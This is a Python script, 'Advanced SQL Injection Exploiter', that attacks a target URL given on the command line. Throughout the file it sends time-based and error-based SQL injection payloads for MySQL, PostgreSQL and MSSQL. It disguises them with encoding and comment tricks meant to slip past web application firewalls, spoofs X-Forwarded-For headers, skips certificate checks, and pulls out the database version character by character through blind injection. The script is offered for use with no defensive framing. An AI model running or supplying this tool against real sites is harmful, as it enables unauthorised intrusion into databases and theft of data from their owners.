#!/usr/bin/env python3
"""
Advanced SQL Injection Exploiter - Bypass WAF & Filters
"""

import requests
import time
import sys
import urllib.parse
import random
import string

class AdvancedSQLiExploiter:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.session.verify = False
        self.delay_threshold = 2
        
    def log(self, message):
        timestamp = time.strftime("%H:%M:%S")
        print(f"[{timestamp}] {message}")
    
    def generate_evasion_payloads(self, base_payload):
        """Generate WAF evasion payloads"""
        evasion_techniques = [
            # URL Encoding
            lambda p: urllib.parse.quote(p),
            
            # Double URL Encoding
            lambda p: urllib.parse.quote(urllib.parse.quote(p)),
            
            # Unicode Encoding
            lambda p: p.replace("'", "%u0027").replace(" ", "%u0020"),
            
            # Case Manipulation
            lambda p: ''.join(random.choice([c.upper(), c.lower()]) for c in p),
            
            # White Space Manipulation
            lambda p: p.replace(" ", "/**/").replace("(", "%28").replace(")", "%29"),
            
            # Comment Injection
            lambda p: p.replace(" ", "/**/").replace("AND", "/*!AND*/"),
            
            # Hex Encoding
            lambda p: p.replace("SELECT", "SEL" + "ECT").replace("UNION", "UNI" + "ON"),
        ]
        
        payloads = [base_payload]  # Start with original
        
        for technique in evasion_techniques:
            try:
                payloads.append(technique(base_payload))
            except:
                pass
        
        return payloads
    
    def test_time_based(self):
        """Test time-based SQL injection with evasion"""
        self.log("Testing Time-Based SQLi with WAF evasion...")
        
        time_payloads = [
            "' AND SLEEP(5)--",
            "' OR IF(1=1,SLEEP(5),0)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND BENCHMARK(5000000,MD5('test'))--"
        ]
        
        for base_payload in time_payloads:
            evasion_payloads = self.generate_evasion_payloads(base_payload)
            
            for payload in evasion_payloads:
                try:
                    self.log(f"Trying: {payload[:50]}...")
                    
                    start_time = time.time()
                    url = f"{self.target}{payload}"
                    
                    # Add random headers to avoid WAF
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'X-Forwarded-For': f'127.0.0.{random.randint(1, 255)}',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate',
                        'Connection': 'keep-alive'
                    }
                    
                    response = self.session.get(url, headers=headers, timeout=15)
                    response_time = time.time() - start_time
                    
                    if response_time > 4:
                        self.log(f"üö® TIME-BASED SQLI DETECTED!")
                        self.log(f"   Payload: {payload}")
                        self.log(f"   Delay: {response_time:.2f}s")
                        return True
                        
                except requests.exceptions.Timeout:
                    self.log(f"‚è±Ô∏è TIMEOUT - Possible SQLi with: {payload[:50]}...")
                    return True
                except Exception as e:
                    continue
        
        return False
    
    def test_error_based_advanced(self):
        """Test advanced error-based techniques"""
        self.log("Testing Advanced Error-Based SQLi...")
        
        error_payloads = [
            # MySQL Error-based
            "' AND EXTRACTVALUE(1,CONCAT(0x3a,VERSION()))--",
            "' AND UPDATEXML(1,CONCAT(0x3a,VERSION()),1)--",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            
            # PostgreSQL Error-based
            "' AND CAST(VERSION() AS INT)--",
            "' AND 1=CAST((SELECT VERSION()) AS INT)--",
            
            # MSSQL Error-based
            "' AND 1=CONVERT(INT,(SELECT VERSION()))--",
        ]
        
        for base_payload in error_payloads:
            evasion_payloads = self.generate_evasion_payloads(base_payload)
            
            for payload in evasion_payloads:
                try:
                    url = f"{self.target}{payload}"
                    response = self.session.get(url, timeout=10)
                    
                    # Check for database errors in response
                    error_indicators = [
                        'mysql', 'sql', 'syntax', 'error', 'warning',
                        'version', 'database', 'query failed'
                    ]
                    
                    if any(indicator in response.text.lower() for indicator in error_indicators):
                        self.log(f"üö® ERROR-BASED SQLI DETECTED!")
                        self.log(f"   Payload: {payload}")
                        self.log(f"   Error found in response")
                        return True
                        
                except Exception as e:
                    continue
        
        return False
    
    def blind_data_extraction(self, condition_payload):
        """Extract data using blind boolean techniques"""
        self.log("Attempting Blind Data Extraction...")
        
        # Extract database version character by character
        version = ""
        chars = string.ascii_letters + string.digits + ".-_"
        
        for position in range(1, 20):
            char_found = False
            
            for char in chars:
                # Test if character at position matches
                payload = f"' AND SUBSTRING(VERSION(),{position},1)='{char}'--"
                evasion_payloads = self.generate_evasion_payloads(payload)
                
                for evaded_payload in evasion_payloads:
                    try:
                        url = f"{self.target}{evaded_payload}"
                        start_time = time.time()
                        response = self.session.get(url, timeout=10)
                        response_time = time.time() - start_time
                        
                        # If response is different (you might need to adjust this logic)
                        normal_response = self.session.get(f"{self.target}?id=1", timeout=10)
                        
                        if response_time > 3 or len(response.text) != len(normal_response.text):
                            version += char
                            self.log(f"   Version: {version}")
                            char_found = True
                            break
                            
                    except:
                        continue
                
                if char_found:
                    break
            
            if not char_found:
                break
        
        if version:
            self.log(f"‚úÖ DATABASE VERSION: {version}")
            return version
        
        return None
    
    def exploit(self):
        """Main exploitation method"""
        self.log("üöÄ STARTING ADVANCED SQL INJECTION EXPLOITATION")
        self.log("=" * 60)
        
        # Test different techniques
        techniques = [
            ("Time-Based", self.test_time_based),
            ("Error-Based", self.test_error_based_advanced),
        ]
        
        for tech_name, tech_function in techniques:
            self.log(f"\nüîß Testing {tech_name}...")
            if tech_function():
                self.log(f"‚úÖ {tech_name} SUCCESSFUL!")
                
                # If time-based works, try data extraction
                if tech_name == "Time-Based":
                    self.blind_data_extraction("")
                
                break
        else:
            self.log("‚ùå No technique worked - Target might have strong WAF")
        
        self.log("=" * 60)
        self.log("üéØ EXPLOITATION COMPLETED")

def main():
    if len(sys.argv) != 2:
        print("Advanced SQL Injection Exploiter")
        print("Usage: python3 advanced_exploit.py <TARGET_URL>")
        print("Example: python3 advanced_exploit.py \"https://example.com/?id=1\"")
        sys.exit(1)
    
    target_url = sys.argv[1]
    
    # Ensure URL has parameter
    if '?' not in target_url:
        target_url += "?id=1"
    
    exploiter = AdvancedSQLiExploiter(target_url)
    exploiter.exploit()

if __name__ == "__main__":
    main()